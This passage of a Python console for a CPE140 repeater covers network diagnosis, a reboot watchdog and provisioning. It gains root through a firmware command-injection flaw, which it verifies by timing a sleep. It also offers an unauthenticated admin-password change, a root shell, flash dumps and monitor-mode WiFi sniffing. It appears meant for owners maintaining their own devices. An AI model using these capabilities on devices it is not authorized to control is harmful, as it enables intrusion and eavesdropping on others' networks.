        L.append("\n--- 1. 上行无线 (apcli0) ---")
        L.append(sh("iwinfo apcli0 info 2>&1 | head -8"))

        # ARP 里的上游网关
        gw = sh("ip route | awk '/^default/ {print $3; exit}'")
        L.append(f"\n--- 2. 默认网关 / 路由 ---\n网关: {gw or '(没有默认路由!)'}")
        L.append(sh("ip route"))
        gwarp = sh("awk 'NR>1 && $1==\"%s\" && $4!=\"00:00:00:00:00:00\" {print $4}' /proc/net/arp" % gw) if gw else ""
        L.append("网关 ARP: " + (gwarp or "(没有有效条目 -> 二层可能不通)"))

        # 三层测试（任一目标通即算通，和看门狗/软修复同一个判据）
        L.append("\n--- 3. 三层连通性 ---")
        def pingable(t):
            return sh(f"ping -c 1 -W 2 {t} >/dev/null 2>&1 && echo y") == "y"

        gw_up = bool(gw) and pingable(gw)
        res = {t: pingable(t) for t in WAN_TARGETS}
        net_up = any(res.values())
        L.append(f"网关 {gw}: {'通' if gw_up else '不通'}")
        L.append("外网: " + "  ".join(f"{t}={'通' if v else '不通'}" for t, v in res.items()))
        dns_raw = sh("nslookup www.baidu.com 114.114.114.114 2>&1 | tail -4")
        dns_ok = "Address" in dns_raw or "address" in dns_raw
        L.append(f"外网 DNS 查询: {'通' if dns_ok else '失败'}")
        L.append(dns_raw)

        # 固件那条「强制门户」劫持链
        L.append("\n--- 4. 固件自带的门户口（假断网元凶） ---")
        hij = sh("iptables -t nat -S 2>/dev/null | grep -E 'detect_internet|lan_redirect|dport 53 -j DNAT|dport 80 -j DNAT'")
        hijack = bool(hij) and "<执行失败" not in hij and bool(hij.strip())
        L.append("劫持规则: " + (hij if hijack else "无（正常）"))
        istat = sh("cat /tmp/.internet_status 2>/dev/null")
        L.append(f"固件自报的互联网状态: {istat!r}（实测网络正常时它一直写 0）")
        L.append("检测进程: " + (sh("pidof detect_internet") or "未运行"))
        vap5 = sh("uci -q get wireless.vap5.disabled 2>/dev/null")
        L.append(f"上行禁用旗 vap5.disabled: {vap5 or '(未设置)'}  "
                 "(1 = 固件自己的 aptrack 把上行关了，它要等 200 秒才恢复)")

        # 上行接口 & DHCP
        L.append("\n--- 5. 上行接口 wan ---")
        L.append(sh("ubus call network.interface.wan status 2>/dev/null "
                   "| grep -E '\"up\"|\"address\"|\"proto\"' | head -4"))

        # 相关守护
        L.append("\n--- 6. 相关守护进程 ---")
        L.append(sh("ps w | grep -E 'aptrack|detect_internet|wpa_supp|udhcpc|netguard' | grep -v grep"))

        # 日志尾部（滤掉我们自己刷屏的噪声，否则真消息会被挤掉）
        L.append("\n--- 7. 系统日志 (有意义的尾 25 行) ---")
        L.append(sh("logread 2>/dev/null | grep -v 'Broken pipe' | grep -v drop_caches | tail -25"))

        # ---- 判定 ----
        L.append("\n========== 判定 ==========")
        if net_up and hijack:
            L.append("→ 【假断网】外网其实是通的，但固件的门户劫持规则在生效：")
            L.append("  它把你的 DNS(53) 和网页(80) 抢到自己的页面上，所以你『上不了网』。")
            L.append("  这就是那种“没动什么就又好了”的断网，也是最可疑的假断网。")
            L.append("  ✅ 立即恢复: python cpe140.py fix   (第一步 kill -USR1 就会清掉)")
            L.append("  ✅ 根治(可选): uci set detect_internet.main.enable_redirect=0 后重启该服务")
        elif not gw_up:
            L.append("→ 【上行无线/网关不通】设备与上游光猫的链路断了（看第 1 节信号与第 4 节的禁用旗）。")
            if vap5 == "1":
                L.append("  ⚠ 看到 vap5.disabled=1：这是固件自带的 aptrack 把上行关了，"
                         "它会睡 200 秒才自己恢复。")
            L.append("  ✅ 先软修: python cpe140.py fix （重新关联/重拨，比重启轻）")
        elif not net_up:
            L.append("→ 【上游/宽带问题】能到光猫但到不了外网 —— 重启本机基本没用。")
            L.append("  ✅ 检查光猫/宽带；本机最多软修一下上行 DHCP。")
        elif not dns_ok:
            L.append("→ 【DNS 层坏了】外网 IP 通但域名解析不了。")
            L.append("  ✅ 切 DNS 或重启 dnsmasq；这和重启中继器无关。")
        else:
            L.append("→ 【现在一切正常】没抓到现场。下次出问题时立刻再跑一次以便对比。")
        L.append("\n提示: 这是只读取证，没有改动设备的任何东西。")
        return "\n".join(L)

    def close(self) -> None:
        """清理设备上的读取通道 (幂等, 进程退出自动调用)。"""
        if not getattr(self, "_link_ok", False):
            return
        self._link_ok = False
        try:
            self._inject(f"rm -f {OUT_TMP} {OUT_LINK} {UP_TMP} {SH_TMP}")
        except Exception:                                # noqa: BLE001
            pass

    # ------------------------- 断网看门狗 netguard ------------------------- #

    def guard_status(self) -> str:
        return self.run(f"sh {GUARD_SH} status 2>&1")

    def guard_log(self, n: int = 60) -> str:
        return self.run(f"sh {GUARD_SH} log 2>&1 | tail -n {n}")

    def guard_test(self) -> str:
        """干跑：只判断，不重启、不执行恢复。"""
        return self.run(f"sh {GUARD_SH} test 2>&1")

    def guard_reset(self) -> str:
        return self.run(f"sh {GUARD_SH} reset 2>&1")

    def guard_on(self) -> str:
        return self.run(f"sh {GUARD_SH} cron on 2>&1")

    def guard_off(self) -> str:
        return self.run(f"sh {GUARD_SH} cron off 2>&1")

    def guard_install(self, minutes: int = 10, mode: str = "reboot",
                      recover: str = "", enable: bool = True,
                      max_reboot: int = 3, long_wait: int = 21600,
                      softfix: bool = True) -> str:
        """把看门狗脚本（+ 分级软修复）装到设备上（enable=True 同时挂上 crontab）。

        minutes    连续断网多少分钟算断网
        max_reboot 单次断网最多自动重启几次（超限后改 long_wait 秒一次）
        long_wait  超限后的重试间隔（秒，默认 21600 = 6 小时）
        softfix    True（默认）= 重启之前先跑一遍分级软修复；
                   救得回来就不重启，救不回来看门狗才动手
        """
        if mode not in ("reboot", "log"):
            raise CpeError("mode 只能是 reboot 或 log")
        if minutes < 2:
            raise CpeError("分钟数至少 2（脚本每 2 分钟巡检一次）")
        if max_reboot < 1:
            raise CpeError("max_reboot 至少 1")
        if long_wait < 60:
            raise CpeError("long_wait 至少 60 秒")
        if re.search(r"[\n\r'\"`$\\]", recover):
            raise CpeError("recover 里有危险字符（换行/引号/反引号/$/反斜杠）")
        if softfix and not recover:
            recover = FIX_RECOVER
        src = guard_script_path()
        with open(src, "rb") as f:
            self.push_bytes(f.read(), GUARD_SH)
        self.run(f"chmod 755 {GUARD_SH}")
        if softfix or recover == FIX_RECOVER:
            self.netfix_install()          # 先把阶梯脚本装好，再写参数
        conf = ("# 由 cpe140 控制台写入：断网看门狗参数\n"
                f"MINUTES={minutes}\n"
                # 向上取整，保证「选 5 分钟」不会早于 5 分钟动手
                f"FAIL_NEED={min(99, max(1, (minutes + 1) // 2))}\n"
                f"MODE={mode}\n"
                f"MAX_REBOOT={max_reboot}\n"
                f"LONG_WAIT={long_wait}\n"
                f"RECOVER={recover}\n")
        self.push_bytes(conf.encode(), GUARD_CONF)
        self.run(f"chmod 644 {GUARD_CONF}")
        self.guard_on() if enable else self.guard_off()
        return self.guard_status()

    def provision(self, flash_out: str = "", backup: bool = True, enable: bool = True,
                  mode: str = "log", minutes: int = 10, max_reboot: int = 3,
                  long_wait: int = 21600) -> list[tuple[str, str, str]]:
        """给一台（新）机器一键部署：验通道 → 备份 flash → 装软修+看门狗 → 挂 cron。

        默认 mode="log"（只记录不重启）：先观察几天，确认它不误判，再切真重启。
        """
        res: list[tuple[str, str, str]] = []

        def add(item, ok, note):
            res.append((item, "OK" if ok else "FAIL", note))

        try:
            si = self.sysinfo()
            add("① 设备连通", True,
                f"{si.get('PRODUCTNAME', '?')} / {si.get('FIRMVERSION', '?')} @ {self.host}")
        except CpeError as e:
            add("① 设备连通", False, str(e))
            return res

        # 注入通道：拿 sleep 的实测耗时证明值真的被 sh 执行了（而不是被忽略）
        try:
            t0 = time.time(); self.run("true"); base = time.time() - t0
            t0 = time.time(); self.run("sleep 3"); slow = time.time() - t0
            ok = slow - base > 2.0
            add("② root 注入通道", ok, f"true={base:.2f}s / sleep3={slow:.2f}s")
            if not ok:
                add("   —— 中止", False, "注入不生效（固件可能已修），别再往下装")
                return res
        except CpeError as e:
            add("② root 注入通道", False, str(e))
            return res

        try:
            i = self.run("id").strip()
            add("③ 以 root 执行", "uid=0" in i, i)
        except CpeError as e:
            add("③ 以 root 执行", False, str(e))

        if backup:
            out = flash_out or f"cpe140_fullflash_{self.host.replace('.', '_')}.bin"
            try:
                n = self.dump_flash(out, progress=False)
                md5 = hashlib.md5(open(out, "rb").read()).hexdigest()
                add("④ flash 备份", n > 4 * 1024 * 1024, f"{_hb(n)} -> {out}  md5={md5}")
            except Exception as e:                            # noqa: BLE001
                add("④ flash 备份", False, f"{e}（不致命，可稍后 dump-flash 补）")
        else:
            add("④ flash 备份", True, "已跳过（--no-backup）")

        try:
            self.guard_install(minutes, mode, FIX_RECOVER, enable,
                               max_reboot, long_wait, True)
            add("⑤ 装软修+看门狗", True, "netfix.sh + netguard.sh + 2 个参数文件")
        except CpeError as e:
            add("⑤ 装软修+看门狗", False, str(e))
            return res

        try:
            files = " ".join((FIX_SH, FIX_CONF, GUARD_SH, GUARD_CONF))
            got = []
            for ln in self.run(f"ls -l {files} 2>&1").splitlines():
                f = ln.split()
                if len(f) >= 9:
                    got.append(f"{os.path.basename(f[-1])}={f[4]}B")
            add("⑥ 文件已就位", len(got) == 4, f"{len(got)}/4  " + "  ".join(got))
        except CpeError as e:
            add("⑥ 文件已就位", False, str(e))

        try:
            on = self.run("grep -q netguard /etc/crontabs/root 2>/dev/null "
                          "&& echo ON || echo OFF").strip() == "ON"
            add("⑦ 定时任务", True,
                "已挂上（每 2 分钟巡检一次）" if on else "未挂（只放文件，不自动动作）")
        except CpeError as e:
            add("⑦ 定时任务", False, str(e))

        try:
            add("⑧ 当前连通性", True, self.netfix_check().strip().replace("\n", " "))
        except CpeError as e:
            add("⑧ 当前连通性", False, str(e))
        return res

    def guard_uninstall(self) -> str:
        """停用并擦掉脚本/参数（设备回到没装过的状态）。"""
        self.run(f"sh {GUARD_SH} cron off 2>&1")
        return self.run(f"rm -f {GUARD_SH} {GUARD_CONF} /etc/netguard.last "
                        f"/etc/netguard.reboots /tmp/netguard.*; "
                        f"echo 已卸载看门狗（含单次断网重启计数）；"
                        f"分级软修复 {FIX_SH} 还留着，不动它")


# --------------------------------------------------------------------------- #
def gui(host: str, port: int) -> None:                   # pragma: no cover
    import queue
    import threading
    import tkinter as tk
    from tkinter import filedialog, messagebox, simpledialog, ttk

    cpe = Cpe(host, port, timeout=60)
    q: queue.Queue = queue.Queue()
    root = tk.Tk()
    root.title(f"CPE140 完全控制台 — {host}")
    root.geometry("1000x740")

    top = ttk.Frame(root, padding=6); top.pack(fill="x")
    ttk.Label(top, text="设备:", font=("", 10, "bold")).pack(side="left")
    host_var = tk.StringVar(value=host)
    ttk.Entry(top, textvariable=host_var, width=18).pack(side="left", padx=4)
    status = ttk.Label(top, text="就绪", foreground="#0a0"); status.pack(side="left", padx=10)
    nb = ttk.Notebook(root); nb.pack(fill="both", expand=True, padx=6, pady=4)
    cur: dict = {}

    def mk_text(parent):
        f = ttk.Frame(parent); f.pack(fill="both", expand=True)
        t = tk.Text(f, wrap="none", bg="#0f1418", fg="#cfe8cf",
                    insertbackground="#cfe8cf", font=("Consolas", 9))
        sb = ttk.Scrollbar(f, command=t.yview); t.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y"); t.pack(fill="both", expand=True)
        return t

    def target(txt):
        cur["t"] = txt

    def show(res, txt=None):
        txt = txt or cur["t"]
        s = res if isinstance(res, str) else json.dumps(res, ensure_ascii=False, indent=2)
        txt.delete("1.0", "end"); txt.insert("end", s + "\n"); txt.see("end")

    def bg(fn, txt=None, title=None):
        if txt:
            target(txt)
        if title:
            cur["t"].insert("end", f"\n=== {title} ===\n")
        status.configure(text="执行中…", foreground="#c80")

        def work():
            try:
                r = fn()
            except Exception as e:                       # noqa: BLE001
                r = f"!! {type(e).__name__}: {e}"
            q.put((r, txt))
        threading.Thread(target=work, daemon=True).start()

    def pump():
        try:
            while True:
                r, txt = q.get_nowait()
                status.configure(text="就绪", foreground="#0a0")
                if txt is not None:
                    show(r, txt)
                else:
                    cur["t"].insert("end", (r if isinstance(r, str)
                                            else json.dumps(r, ensure_ascii=False, indent=2)) + "\n")
                    cur["t"].see("end")
        except queue.Empty:
            pass
        root.after(150, pump)

    def bar(parent):
        b = ttk.Frame(parent, padding=4); b.pack(fill="x"); return b

    def howto():
        w = tk.Toplevel(root); w.title("命令手册 / 教程"); w.geometry("860x660")
        t = tk.Text(w, wrap="word", bg="#0f1418", fg="#cfe8cf", font=("Consolas", 9))
        sb = ttk.Scrollbar(w, command=t.yview); t.configure(yscrollcommand=sb.set)
        sb.pack(side="right", fill="y"); t.pack(fill="both", expand=True)
        t.insert("end", HOWTO.strip() + "\n")
        ttk.Button(w, text="关闭", command=w.destroy).pack(pady=4)

    # 概览
    t1 = ttk.Frame(nb); nb.add(t1, text=" 概览 "); b1 = bar(t1); x1 = mk_text(t1)
    for lbl, fn in (("设备信息", cpe.sysinfo), ("链路状态", cpe.wireless_status),
                    ("WAN", cpe.wan), ("LAN", cpe.lan), ("无线配置", cpe.wifi_config)):
        ttk.Button(b1, text=lbl, width=10,
                   command=lambda f=fn, l=lbl: bg(f, x1, l)).pack(side="left", padx=2)
    ttk.Button(b1, text="自检/漏洞确认", width=14,
               command=lambda: bg(lambda: "\n".join(
                   f"{n:22s} {o:4s} {c}" for n, o, c in cpe.doctor()), x1, "doctor")
               ).pack(side="left", padx=8)

    # 客户端
    t2 = ttk.Frame(nb); nb.add(t2, text=" 客户端/扫描 "); b2 = bar(t2); x2 = mk_text(t2)
    for lbl, fn in (("DHCP 客户端", cpe.clients), ("ARP 表", cpe.arp),
                    ("WiFi 扫描", lambda: cpe.scan(0)), ("信道占用", cpe.channels),
                    ("会话", cpe.active)):
        ttk.Button(b2, text=lbl, width=12, command=lambda f=fn, l=lbl: bg(f, x2, l)).pack(side="left", padx=2)

    # 配置
    t3 = ttk.Frame(nb); nb.add(t3, text=" 配置 "); b3 = bar(t3); x3 = mk_text(t3)
    ttk.Button(b3, text="读取全部", command=lambda: bg(cpe.cfg_all, x3, "全部配置")).pack(side="left", padx=2)
    def _bk():
        fn = filedialog.asksaveasfilename(defaultextension=".json",
                                          initialfile="cpe140_cfg.json") or "cpe140_cfg.json"
        return "已备份 -> " + cpe.backup(fn)

    ttk.Button(b3, text="备份到文件", command=lambda: bg(_bk, x3, "备份")).pack(side="left", padx=2)
    kv_k = tk.StringVar(); kv_v = tk.StringVar()
    ttk.Label(b3, text="  KEY").pack(side="left")
    ttk.Entry(b3, textvariable=kv_k, width=20).pack(side="left")
    ttk.Entry(b3, textvariable=kv_v, width=20).pack(side="left", padx=2)
    ttk.Button(b3, text="写入", command=lambda: bg(
        lambda: cpe.cfg_set(**{kv_k.get(): kv_v.get()}), x3, "写入")).pack(side="left")

    # 终端
    t4 = ttk.Frame(nb); nb.add(t4, text=" 终端 (root) "); b4 = bar(t4); x4 = mk_text(t4)
    var = tk.StringVar(value="id; uname -a; cat /proc/mtd")
    ent = ttk.Entry(b4, textvariable=var, font=("Consolas", 10))
    ent.pack(side="left", fill="x", expand=True)
    ttk.Button(b4, text="执行", command=lambda: (x4.insert("end", f"\n$ {var.get()}\n"),
                                                 x4.see("end"),
                                                 bg(lambda: cpe.run(var.get()), x4))).pack(side="left", padx=3)
    ent.bind("<Return>", lambda _e: (bg(lambda: cpe.run(var.get()), x4)))
    for lbl, c in (("id", "id"), ("ps", "ps w"), ("uci", "uci show"),
                   ("mtd", "cat /proc/mtd"), ("日志", "logread | tail -30")):
        ttk.Button(b4, text=lbl, width=6,
                   command=lambda cc=c: (var.set(cc), bg(lambda: cpe.run(cc), x4))).pack(side="left")
    ttk.Button(b4, text="命令手册", width=10, command=howto).pack(side="left", padx=6)

    # 维护
    t5 = ttk.Frame(nb); nb.add(t5, text=" 诊断/救网 "); b5 = bar(t5); b5b = bar(t5); x5 = mk_text(t5)
    ttk.Button(b5, text="一键盘点（断网取证）", width=20,
               command=lambda: bg(cpe.diagnose, x5, "诊断")).pack(side="left", padx=3)
    ttk.Button(b5, text="分级软修复（比重启温和）", width=22,
               command=lambda: bg(cpe.netfix_run, x5, "软修复")).pack(side="left", padx=3)
    ttk.Button(b5, text="只看能不能修（干跑）", width=18,
               command=lambda: bg(cpe.netfix_dry, x5, "干跑")).pack(side="left", padx=3)
    ttk.Button(b5, text="软修复状态", width=12,
               command=lambda: bg(cpe.netfix_status, x5, "状态")).pack(side="left", padx=3)
    ttk.Button(b5, text="软修复日志", width=12,
               command=lambda: bg(cpe.netfix_log, x5, "日志")).pack(side="left", padx=3)
    ttk.Label(b5b, text="开管理页就又能上网？先点「一键盘点」：它会把行踪是「假断网（固件门户误判劫持 DNS/网页）」还是「真断网（上行挂了）」直接判给你。",
              foreground="#555").pack(side="left")

    def _dump():
        fn = filedialog.asksaveasfilename(defaultextension=".bin",
                                          initialfile="cpe140_fullflash.bin") or "fb.bin"
        return f"已备份 {_hb(cpe.dump_flash(fn))} -> {fn}"

    ttk.Button(b5, text="备份整片 flash", command=lambda: bg(_dump, x5, "flash")).pack(side="left", padx=3)
    ttk.Button(b5, text="改 Web 口令", command=lambda: bg(
        lambda: cpe.set_password(simpledialog.askstring("改密", "新口令:", show="*") or ""),
        x5, "改密")).pack(side="left", padx=3)
    ttk.Button(b5, text="重启设备", command=lambda: messagebox.askyesno(
        "确认", "重启设备? 会短暂断网。") and bg(
        lambda: "重启命令已发送" if cpe.reboot() else "失败", x5, "重启")).pack(side="left", padx=3)
    ttk.Button(b5, text="清残留并退出", command=lambda: (cpe.close(), root.destroy())).pack(side="left", padx=3)

    # 断网看门狗
    t6 = ttk.Frame(nb); nb.add(t6, text=" 看门狗 "); b6a = bar(t6); b6 = bar(t6); x6 = mk_text(t6)
    ttk.Label(b6a, text="断网看门狗：设备每 2 分钟 ping 一次外网；连续", foreground="#333").pack(side="left")
    gmin = tk.StringVar(value="10")
    ttk.Entry(b6a, textvariable=gmin, width=4).pack(side="left")
    ttk.Label(b6a, text="分钟不通 → 自动重启它自己（30 分钟冷却、单次断网最多 3 次，与「定时重启」互不干扰）",
              foreground="#333").pack(side="left")

    def _g_on():
        m = int(gmin.get() or 10)
        if not messagebox.askyesno("确认开启", f"安装并启用断网看门狗：\n连续 {m} 分钟不通外网就自动重启设备。\n\n"
                                   "只会在真的断网时才重启；30 分钟冷却；\n"
                                   "单次断网最多重启 3 次，之后再等 6 小时才试（不会无限重启）。\n\n确认？"):
            return
        bg(lambda: cpe.guard_install(minutes=m), x6, "开启看门狗")

    ttk.Button(b6, text="开启（装+启用）", width=16, command=_g_on).pack(side="left", padx=3)
    ttk.Button(b6, text="停用", width=8, command=lambda: bg(cpe.guard_off, x6, "停用")).pack(side="left", padx=3)
    for lbl, fn in (("状态", cpe.guard_status), ("干跑（不重启）", cpe.guard_test),
                    ("日志", cpe.guard_log), ("重置计数", cpe.guard_reset)):
        ttk.Button(b6, text=lbl, width=14,
                   command=lambda f=fn, l=lbl: bg(f, x6, l)).pack(side="left", padx=3)
    ttk.Button(b6, text="卸载看门狗", command=lambda: messagebox.askyesno(
        "确认", "删掉设备上的 /etc/netguard.sh 和它的定时任务？") and bg(
        cpe.guard_uninstall, x6, "卸载")).pack(side="left", padx=3)
    bg(cpe.guard_status, x6, "当前状态")
    root.after(150, pump)
    root.mainloop()


# --------------------------------------------------------------------------- #
def _rows(v):
    if isinstance(v, list):
        return [x for x in v if isinstance(x, dict)]
    if isinstance(v, dict):
        for k in ("list", "data", "items", "dhcpd_leases", "clientlist", "aplist"):
            if isinstance(v.get(k), list):
                return [x for x in v[k] if isinstance(x, dict)]
        return [v]
    return []


def _table(rows):
    if not rows:
        print("(空)"); return
    cols = list(rows[0].keys())
    w = [max(len(str(c)), *(len(str(r.get(c, ""))) for r in rows)) for c in cols]
    line = "  ".join(str(c).ljust(x) for c, x in zip(cols, w))
    print(line); print("-" * len(line))
    for r in rows:
        print("  ".join(str(r.get(c, "")).ljust(x) for c, x in zip(cols, w)))


def _find_sniff_tool() -> str | None:
    """定位 re-router 里的 wifi_sniff.py（monitor 抓包工具）。"""
    here = os.path.dirname(os.path.abspath(__file__))
    cands = [os.environ.get("CPE140_SNIFF", "")]
    cands += [
        os.path.join(here, "tools", "wifi_sniff.py"),
        os.path.join(here, "..", "re-router", "re", "tools", "wifi_sniff.py"),
        os.path.join(here, "..", "备份代码", "re-router", "re", "tools", "wifi_sniff.py"),
    ]
    for c in cands:
        if c and os.path.isfile(os.path.normpath(c)):
            return os.path.normpath(c)
    return None


def _cmd_sniff(a) -> int:
    """把 `sniff` 转给独立的 wifi_sniff.py（monitor 模式抓包）。"""
    tool = _find_sniff_tool()
    if not tool:
        print("找不到抓包工具 wifi_sniff.py。\n"
              "请设 CPE140_SNIFF=<路径>，或直接跑：\n"
              "  python <re-router>/re/tools/wifi_sniff.py --host " + a.host)
        return 2
    argv = [sys.executable, tool, "--host", a.host, "--port", str(a.port),
            "--seconds", str(a.seconds), "--sweep", str(a.sweep), "--top", str(a.top)]
    if a.pcap:
        argv += ["--pcap", a.pcap]
    if a.keep:
        argv += ["--keep"]
    if a.json:
        argv += ["--json"]
    return subprocess.call(argv)


def main(argv=None) -> int:
    p = argparse.ArgumentParser(
        prog="cpe140", description="易阔 CPE140 / BHU BXO2000n-2S-Lite 中继器完全控制台",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    p.add_argument("--host", default=os.environ.get("CPE140_HOST", DEFAULT_HOST))
    p.add_argument("--port", type=int, default=80)
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--json", action="store_true", help="原始 JSON 输出")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--version", action="version", version=f"cpe140-ctrl {__version__}")
    sub = p.add_subparsers(dest="cmd")

    for name, helptext in (("info", "设备信息/型号/固件"), ("status", "上行链路 + WAN/LAN 概览"),
                           ("clients", "DHCP 客户端列表"), ("arp", "ARP 表"),
                           ("channels", "信道占用"), ("wifi", "本机 AP + 上行无线配置"),
                           ("sessions", "Web 会话"), ("doctor", "自检 + 漏洞确认"),
                           ("gui", "图形界面"), ("shell", "交互式 root shell"),
                           ("howto", "使用教程（先看这个）"),
                           ("uci", "uci show 全量"), ("clean", "清理设备上的临时文件"),
                           ("reboot", "重启设备")):
        sp = sub.add_parser(name, help=helptext)
        if name == "reboot":
            sp.add_argument("--wait", action="store_true")

    sp = sub.add_parser("scan", help="周边 WiFi 扫描"); sp.add_argument("--wlanid", type=int, default=0)
    sp = sub.add_parser("sh", help="以 root 执行命令")
    sp.add_argument("command", nargs="+"); sp.add_argument("--timeout", type=float, default=120.0)
    sp = sub.add_parser("cat", help="读设备上任意文件 (root)")
    sp.add_argument("file"); sp.add_argument("-o", "--out")
    sp = sub.add_parser("cfg", help="读配置 (全部/指定 key/正则过滤)")
    sp.add_argument("keys", nargs="*"); sp.add_argument("--grep")
    sp = sub.add_parser("set", help="写配置 KEY=VALUE …")
    sp.add_argument("kv", nargs="+"); sp.add_argument("--force", action="store_true")
    sp = sub.add_parser("backup", help="备份全量配置到 JSON"); sp.add_argument("file")
    sp = sub.add_parser("restore", help="从 JSON 恢复配置")
    sp.add_argument("file"); sp.add_argument("--force", action="store_true")
    sp = sub.add_parser("push", help="上传文件到设备"); sp.add_argument("local"); sp.add_argument("remote")
    sp = sub.add_parser("pull", help="从设备下载文件"); sp.add_argument("remote"); sp.add_argument("local")
    sp = sub.add_parser("dump-flash", help="整片 flash 备份 (救砖)")
    sp.add_argument("out", nargs="?", default="cpe140_fullflash.bin")
    sp.add_argument("--mtd", type=int, default=9)
    sp = sub.add_parser("password", help="改 Web 管理员口令 (免认证)")
    sp.add_argument("newpw"); sp.add_argument("--user", default="admin")
    sp = sub.add_parser("schedule", help="定时重启设置")
    sp.add_argument("--off", action="store_true"); sp.add_argument("--week", type=int, default=0)
    sp.add_argument("--hour", type=int, default=4); sp.add_argument("--minute", type=int, default=0)
    sp = sub.add_parser("diagnose", help="断网取证：一键盘点每一层 + 判定到底哪层坏了")
    sp = sub.add_parser("fix", help="分级软修复：从轻到重救网，比直接重启温和")
    sp.add_argument("action", nargs="?", default="run",
                    choices=["run", "check", "dry", "status", "log", "install"])
    sp = sub.add_parser("provision", help="新机器一键部署：验漏洞 + 备份 flash + 装软修/看门狗")
    sp.add_argument("--flash-out", default="", help="flash 备份存到哪（默认 cpe140_fullflash_<ip>.bin）")
    sp.add_argument("--no-backup", action="store_true", help="跳过整片 flash 备份")
    sp.add_argument("--no-enable", action="store_true", help="只放文件，不挂 cron")
    sp.add_argument("--mode", choices=["log", "reboot"], default="log",
                    help="log=只记录（默认，先观察几天）/ reboot=真重启")
    sp.add_argument("--minutes", type=int, default=10, help="连续断网多少分钟算断网（默认 10）")
    sp.add_argument("--max-reboot", type=int, default=3, help="单次断网最多自动重启几次（默认 3）")
    sp.add_argument("--long-wait", type=int, default=21600, help="超限后的重试间隔秒数（默认 21600）")
    sp = sub.add_parser("guard", help="断网看门狗：持续断网自动重启")
    sp.add_argument("action", nargs="?", default="status",
                    choices=["status", "on", "off", "log", "test", "reset",
                             "install", "uninstall"])
    sp.add_argument("--minutes", type=int, default=10, help="连续断网多少分钟算断网（默认 10）")
    sp.add_argument("--mode", choices=["reboot", "log"], default="reboot",
                    help="reboot=到点重启（默认）/ log=只记录不重启")
    sp.add_argument("--recover", default="", help="可选轻量恢复命令，例如 'wifi down; sleep 3; wifi up'")
    sp.add_argument("--max-reboot", type=int, default=3,
                    help="单次断网最多自动重启几次（默认 3；超限后转长退避）")
    sp.add_argument("--long-wait", type=int, default=21600,
                    help="超限后的重试间隔秒数（默认 21600 = 6 小时）")
    sp.add_argument("--no-enable", action="store_true", help="只装不启用")
    sp.add_argument("--no-softfix", action="store_true",
                    help="不要「先软后硬」：到点直接重启（默认先跑分级软修复）")
    sp = sub.add_parser("sniff", help="抓包附近 WiFi（monitor 嗅探，边抓边扫全信道）")
    sp.add_argument("--seconds", type=int, default=12, help="抓包总时长秒（默认 12）")
    sp.add_argument("--sweep", type=int, default=3,
                    help="每隔几秒让设备自扫一次（覆盖全信道）；0=只抓当前信道（默认 3）")
    sp.add_argument("--pcap", default=None, help="把原始 pcap 存到本地（Wireshark 可开）")
    sp.add_argument("--keep", action="store_true", help="抓完保留 mon0 接口")
    sp.add_argument("--top", type=int, default=30, help="客户端列出前 N 个")
    sp = sub.add_parser("mode", help="工作模式切换 (危险)")
    sp.add_argument("mode", choices=list(MODE_MAP)); sp.add_argument("--force", action="store_true")
    sp = sub.add_parser("factory-reset", help="恢复出厂 (危险!)"); sp.add_argument("--yes", action="store_true")
    sp = sub.add_parser("upgrade", help="固件升级 (危险!)")
    sp.add_argument("file"); sp.add_argument("--force", action="store_true")

    a = p.parse_args(argv)
    if not a.cmd:
        p.print_help(); return 0
    if a.cmd == "howto":
        print(HOWTO); return 0
    if a.cmd == "sniff":
        return _cmd_sniff(a)
    cpe = Cpe(a.host, a.port, getattr(a, "timeout", 30.0) or 30.0, a.verbose)

    try:
        if a.cmd == "guard":
            if a.action == "status":
                print(cpe.guard_status())
            elif a.action == "on":
                print(cpe.guard_on(), "\n" + cpe.guard_status())
            elif a.action == "off":
                print(cpe.guard_off(), "\n" + cpe.guard_status())
            elif a.action == "log":
                print(cpe.guard_log())
            elif a.action == "test":
                print(cpe.guard_test())
            elif a.action == "reset":
                print(cpe.guard_reset())
            elif a.action == "install":
                print(cpe.guard_install(a.minutes, a.mode, a.recover, not a.no_enable,
                                        a.max_reboot, a.long_wait, not a.no_softfix))
            elif a.action == "uninstall":
                print(cpe.guard_uninstall())
            return 0
        if a.cmd == "provision":
            rows = cpe.provision(a.flash_out, not a.no_backup, not a.no_enable,
                                 a.mode, a.minutes, a.max_reboot, a.long_wait)
            for n, o, c in rows:
                print(f"{n:18s} {o:4s} {c}")
            bad = [n for n, o, _ in rows if o == "FAIL"]
            print()
            if bad:
                print("⚠ 有失败项：" + "、".join(bad))
                return 1
            print("✅ 部署完成。后续：")
            if a.no_enable:
                print("  · 文件已就位但没挂 cron，随时可开：")
                print(f"      python cpe140.py --host {a.host} guard install --mode log")
            elif a.mode == "log":
                print("  · 现在是「只记录」模式（**不会重启**）。观察 2~3 天：")
                print(f"      python cpe140.py --host {a.host} guard log")
                print("  · 确认它只在真断网时计数后，切成真重启：")
                print(f"      python cpe140.py --host {a.host} guard install --mode reboot")
            else:
                print("  · 看门狗已开启（真重启）。断网先跑诊断，别急着重启：")
                print(f"      python cpe140.py --host {a.host} diagnose")
            print(f"  · 平时看状态：python cpe140.py --host {a.host} guard status")
            print(f"  · 刷固件/恢复出厂前先停用：python cpe140.py --host {a.host} guard off")
            return 0
        if a.cmd == "diagnose":
            print(cpe.diagnose()); return 0
        if a.cmd == "fix":
            if a.action == "install":
                print(cpe.netfix_install())
            elif a.action == "status":
                print(cpe.netfix_status())
            elif a.action == "check":
                print(cpe.netfix_check())
            elif a.action == "dry":
                print(cpe.netfix_dry())
            elif a.action == "log":
                print(cpe.netfix_log())
            else:
                print(cpe.netfix_run())
            return 0
        if a.cmd == "gui":
            gui(a.host, a.port); return 0
        if a.cmd == "shell":
            cpe.shell(); return 0
        if a.cmd == "clean":
            cpe.close()
            left = cpe.run("rm -f /tmp/.cpeout /tmp/.cpesh /tmp/upload.img /www/.cpeout; "
                           "ls -a /tmp /www | grep -ci cpe").strip()
            print(f"已清理设备临时文件 (残留 {left or 0} 项)"); return 0
        if a.cmd == "reboot":
            print("重启中…" if cpe.reboot(a.wait) else "失败"); return 0
        if a.cmd == "doctor":
            for n, o, c in cpe.doctor():
                print(f"{n:22s} {o:4s} {c}")
            return 0
        if a.cmd == "factory-reset":
            if not a.yes:
